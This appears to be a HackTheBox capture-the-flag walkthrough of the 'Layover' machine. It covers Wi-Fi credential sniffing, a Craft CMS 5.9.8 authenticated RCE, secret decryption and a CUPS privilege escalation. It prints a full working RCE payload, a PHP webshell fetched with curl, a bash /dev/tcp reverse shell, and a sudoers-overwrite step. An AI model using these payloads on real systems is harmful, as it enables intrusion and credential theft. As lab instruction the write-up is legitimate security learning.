Layover

Hard
OS: Linux

Connected via RDP to a jumpbox with wireless interfaces, sniffed open Wi-Fi traffic to capture cleartext credentials, exploited Craft CMS 5.9.8 authenticated RCE via Yii2 behavior injection, decrypted a service account password from the database, and escalated to root through a CUPS 2.4.16 local privilege escalation vulnerability (CVE-2026-34990).

Key Vulnerabilities
Open Wi-Fi Credential Sniff Craft CMS Auth RCE CVE-2026-34990 (CUPS LPE) Cleartext Credential Exposure
Tools Used
nmap xfreerdp tshark nmcli curl netcat mysql

Summary

Welcome to the walkthrough for Layover, a Hard-rated HackTheBox machine that chains together wireless network exploitation, web application compromise, and a Linux local privilege escalation into a deeply satisfying multi-pivot attack path. This box is unique in that the initial access doesn't start with the target itself — you RDP into a jumpbox with wireless interfaces, sniff credentials off an open Wi-Fi network, and work your way inward.

Attack Chain: RDP → Open Wi-Fi Credential Sniff → Craft CMS Authenticated RCE → Decrypt Service Account → SSH → CUPS LPE → Root

1. Initial Access (Jumpbox)

Port Scanning

We begin with a full port scan against the target machine to identify available services.

nmap -sC -sV -p- 10.129.122.25

Open Ports Discovered:

Port State Service
22/tcp open ssh
3389/tcp open ms-wbt-server (RDP)

SSH and RDP are the only exposed services. We're given RDP credentials to connect to the jumpbox.

RDP Connection

Connect to the jumpbox using the provided contractor credentials:

xfreerdp /v:10.129.122.25 /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution

Enumeration on the Jumpbox

Once inside, we check our identity and permissions:

whoami
id
sudo -l

Output:

contractor
uid=1001(contractor) gid=1001(contractor) groups=1001(contractor),27(sudo),111(netdev),121(wireshark)
User contractor may run the following commands on airside-ws01:
    (ALL : ALL) ALL

Key observations: we have sudo ALL, membership in the wireshark group (packet capture), and the netdev group (network device management). This immediately suggests wireless network interaction.

2. Wireless Pivot & Credential Capture

Interface Discovery

Enumerate available network interfaces:

ip a
iwconfig
nmcli device

Two virtual wireless interfaces are available: wlan2 and wlan3. This is where the box gets interesting — we'll use one to connect to the network and the other in monitor mode to sniff traffic.

Connect to the Open Passenger Network

Scan for available Wi-Fi networks and connect:

sudo nmcli device wifi list
sudo nmcli device wifi connect "HTB International WiFi" ifname wlan2
ip a show wlan2

Output:

inet 10.13.37.182/24

We're now on the internal passenger network at 10.13.37.182.

Monitor Mode & Traffic Capture

Put the second wireless interface into monitor mode on channel 6:

sudo nmcli device set wlan3 managed no
sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6

Start capturing traffic:

sudo tshark -i wlan3 -w /tmp/wifi.pcap

Extract Cleartext Credentials

After capturing for a few minutes, analyze the PCAP for HTTP POST requests containing login data:

sudo tshark -r /tmp/wifi.pcap -Y 'http.request.method == "POST"' -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value

Output:

10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!

The open Wi-Fi network has zero encryption — anyone on the same network can sniff cleartext HTTP credentials. We've captured credentials for jenny:Fl1ghtDeck2026!.

3. Craft CMS Access

Browse to http://portal.international.htb/admin and login with the captured credentials:

  • Username: jenny
  • Password: Fl1ghtDeck2026!

We land in the Craft CMS Control Panel as a Content Editor — a low-privileged account, but still authenticated. The CMS is running Craft CMS 5.9.8.

4. Authenticated RCE (Yii2 Behavior Injection)

Craft CMS 5.9.8 is vulnerable to authenticated Remote Code Execution via AttributeTypecastBehavior injection through the element-search endpoint — a patch bypass of earlier CVEs in the Yii2 framework layer.

Confirm RCE (Time-Based)

We use the browser developer console (on the dashboard) to inject a time-based payload confirming command execution:

(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const fire = (cmd) => {
    const b = {
      elementType: "craft\\elements\\Category",
      siteId: 1,
      search: "",
      condition: {
        class: "craft\\elements\\conditions\\ElementCondition",
        elementType: "craft\\elements\\Category",
        fieldLayouts: [{
          "as rce": {
            "__class": "yii\\behaviors\\AttributeTypecastBehavior",
            "__construct()": [{
              attributeTypes: {
                typecastBeforeSave: [
                  "Psy\\Readline\\Hoa\\ConsoleProcessus",
                  "execute"
                ]
              },
              typecastBeforeSave: cmd
            }]
          },
          "on *": "self::beforeSave"
        }]
      }
    };
    return fetch('/admin/actions/element-search/search', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-CSRF-Token': csrf
      },
      body: JSON.stringify(b)
    }).then(r => r.text());
  };
  console.log(await fire("sleep 5"));
})();

The response takes approximately 5 seconds, confirming blind command execution on the server.

5. Webshell & Reverse Shell

Drop a Webshell

On the jumpbox, host a simple PHP webshell:

cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

cd /tmp && python3 -m http.server 8080

Use the RCE to download the webshell onto the target:

// In browser console, using fire() from above
await fire("curl http://10.13.37.182:8080/shell.php --output /var/www/portal/web/assets/shell.php");

Verify execution:

curl -s "http://portal.international.htb/assets/shell.php?cmd=id"

Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Catch a Reverse Shell

Set up a listener on the jumpbox:

nc -lvnp 4444

Trigger the reverse shell via the webshell:

curl -s "http://portal.international.htb/assets/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.13.37.182/4444+0>%261'"

Stabilize the shell:

python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

Database Credentials

Read the Craft CMS environment file:

cat /var/www/portal/.env

CRAFT_DB_USER=craftuser

Dump Encrypted Credentials

Query the settings table for stored secrets:

mysql -u craftuser -pCraftDB_pw_2026 craft -e 'SELECT * FROM htbairways_settings'

Output:

Key Value
mailRelayUser aporter
mailRelayPassword (base64 encrypted blob)

Decrypt the Service Account Password

Using the Craft security key and Yii2's built-in decryption:

php -r '
require "/var/www/portal/vendor/autoload.php";
$s = new yii\base\Security();
echo $s->decryptByKey(
  base64_decode("u0E7Ogb...Nl5w="),
  "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"
), "\n";
'

Decrypted password:

Ap0rt3r_M@il_2026!

User flag captured.

8. Privilege Escalation (CUPS 2.4.16 — CVE-2026-34990)

CUPS 2.4.16 is running on the target and is vulnerable to a local privilege escalation via Authorization token disclosure combined with file overwrite.

The Attack

The exploit works in three phases:

  1. Token Leak: Create a local IPP printer pointing to a rogue listener. When CUPS connects, it sends its internal Local authorization token in the request headers.
  2. Admin Printer Creation: Using the stolen token, create a file:// queue pointing at sensitive system files (e.g., /etc/sudoers.d/).
  3. File Write: Print a payload (sudoers fragment granting NOPASSWD root) into the file path, bypassing normal filesystem permissions.

Running the Exploit

# As aporter on the target
python3 cups_lpe.py

Output:

[+] Local token: <captured token>
[*] step 1: write sudoers fragment
    [sw] queue add 0x0000 / print HTTP 200 0x0000
[*] sudo -n id -> rc_ok=True :: uid=0(root) gid=0(root) groups=0(root)
[+] ROOT via sudoers

The exploit writes aporter ALL=(ALL) NOPASSWD: ALL to /etc/sudoers.d/aporter-pwn, granting passwordless root access.

Root Flag

sudo -i
cat /root/root.txt

Root flag captured. Machine solved.

Summary & Key Takeaways

The Attack Chain:

RDP to Jumpbox (contractor credentials)
↓
Open Wi-Fi sniffing via monitor mode (cleartext HTTP POST → jenny:Fl1ghtDeck2026!)
↓
Craft CMS 5.9.8 Authenticated RCE (Yii2 behavior injection → www-data)
↓
Database secret extraction + Yii2 decryption → aporter:Ap0rt3r_M@il_2026!
↓
SSH as aporter → user flag
↓
CUPS 2.4.16 CVE-2026-34990 → sudoers write → root

Layover is a masterclass in chained exploitation. The wireless pivot is particularly creative — demonstrating that open Wi-Fi networks in corporate environments are essentially broadcast mediums for credential theft. The Craft CMS RCE leverages Yii2 framework internals through deserialization-adjacent behavior injection, and the CUPS LPE exploits a trust boundary issue where the print service's internal auth token can be intercepted via a crafted printer backend.

Key defensive takeaways: never run captive portals over unencrypted HTTP, rotate CMS secrets regularly, and keep CUPS updated on production servers. Enterprise Wi-Fi should always use WPA2/3-Enterprise with RADIUS — never open networks with captive portals.
